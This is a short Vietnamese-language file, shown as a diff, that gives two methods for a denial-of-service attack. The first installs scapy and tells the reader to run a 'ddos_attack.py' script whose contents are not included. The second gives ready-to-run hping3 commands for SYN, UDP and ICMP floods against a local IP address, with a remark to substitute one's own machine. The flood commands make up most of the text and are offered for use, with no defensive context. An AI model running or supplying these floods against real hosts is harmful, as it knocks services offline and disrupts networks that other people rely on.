@@ -1,0 +1,28 @@
+Cách 1:
+
+sudo apt update
+sudo apt install python3 python3-pip -y
+pip3 install scapy
+
+tạo 1 file tên "ddos_attack.py":
+
+Chạy file để tấn công với lưu lượng giả lập
+python3 ddos_attack.py
+
+
+Cách 2:
+Sử dụng hping3
+
+sudo apt update
+sudo apt install hping3 -y
+
+SYN Flood (TCP SYN):
+sudo hping3 -S -p 5000 --flood 192.168.1.20         ( Thay bằng ip máy của mình )
+
+UDP Flood:
+sudo hping3 --udp -p 5000 --flood 192.168.1.20
+
+ICMP Flood (Ping of Death):
+sudo hping3 --icmp --flood 192.168.1.20
+
+
